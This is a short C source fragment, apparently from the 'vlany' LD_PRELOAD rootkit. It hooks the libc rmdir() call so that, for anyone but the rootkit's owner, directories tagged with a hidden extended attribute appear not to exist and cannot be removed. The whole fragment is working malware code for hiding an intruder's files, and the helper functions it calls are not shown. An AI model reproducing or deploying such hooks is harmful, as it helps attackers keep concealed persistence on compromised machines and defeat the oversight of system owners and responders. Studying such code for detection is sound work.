int rmdir(const char *pathname)
{
    #ifdef DEBUG
        printf("[vlany] rmdir() called\n");
    #endif

    HOOK(old_rmdir, CRMDIR);

    if(owned()) return old_rmdir(pathname);

    if(hidden_xattr(pathname)) { errno = ENOENT; return -1; }

    return old_rmdir(pathname);
}
